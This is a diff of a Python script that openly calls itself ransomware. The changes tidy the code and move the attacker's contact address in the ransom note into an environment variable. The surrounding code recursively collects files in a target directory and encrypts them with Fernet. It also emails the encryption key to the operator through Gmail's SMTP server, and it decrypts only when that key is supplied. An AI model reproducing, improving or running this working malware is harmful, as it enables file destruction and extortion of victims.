@@ -4,7 +4,6 @@ import os
 import pathlib
 import smtplib
 import platform
-from xmlrpc.client import Boolean
 from cryptography.fernet import Fernet
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -12,7 +11,7 @@ from dotenv import load_dotenv
 
 ######################## ARGUMENTS ########################
 
-parser = argparse.ArgumentParser(description='Your files have been encrypted. Contact us (hacker@email.com) for further details and to get the decryption key.')
+parser = argparse.ArgumentParser(description=f'Your files have been encrypted. Contact us ({os.environ.get("gmail_account")}) for further details and to get the decryption key.')
 parser.add_argument('-k', '--key', type=str, metavar='', help='add cryptographic key to decrypt the document')
 parser.add_argument('-b', '--backup', help='add cryptographic key to decrypt the document', action='store_true')
 parser.add_argument('-d', '--directory', type=str, metavar='', help='add cryptographic key to decrypt the document', default='Desktop')
@@ -37,7 +36,6 @@ def get_files_in_dir(current_directory):
             get_files_in_dir(subdirectory) 
     return file_list
 
-
 def send_email():
     load_dotenv() 
     email_address = os.environ.get("gmail_account")
@@ -59,7 +57,6 @@ def send_email():
         f'\n'
         f'Cryptographic Key: { open(crypto_key).read() } \n'
         )
-
     msg.attach(MIMEText(msg_body,'plain'))
     try:
         smtp_server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
@@ -70,14 +67,12 @@ def send_email():
     except Exception as error_msg:
         print ("Error:",error_msg)
 
-
 def generate_key():
     key = Fernet.generate_key()
     with open('cryptographic_key.key', 'wb') as key_file:
         key_file.write(key)
     send_email()
-
-        
+   
 def encrypt_files(file_list):
     with open(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key', 'rb') as key_file:
         cryptographic_key = key_file.read()
@@ -95,7 +90,6 @@ def encrypt_files(file_list):
     else:
         print('No document in directory')
 
-
 def decrypt_files(file_list, cryptographic_key):
     # with open(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key', 'rb') as key_file:
     #     cryptographic_key = key_file.read()
@@ -107,15 +101,14 @@ def decrypt_files(file_list, cryptographic_key):
         with open(document, 'wb') as encrypted_document:
             encrypted_document.write(document_decriptat)
 
-
 ######################## RUNING THE RANSOMWARE ########################
 
 if args.key:
-    desktop = navigate_to_target_directory(args.directory)
-    documente = get_files_in_dir(desktop)
-    decrypt_files(documente, args.key)
+    directory = navigate_to_target_directory(args.directory)
+    documents = get_files_in_dir(directory)
+    decrypt_files(documents, args.key)
 else:
     generate_key()
-    desktop = navigate_to_target_directory(args.directory)
-    documente = get_files_in_dir(desktop)
-    encrypt_files(documente)
+    directory = navigate_to_target_directory(args.directory)
+    documents = get_files_in_dir(directory)
+    encrypt_files(documents)
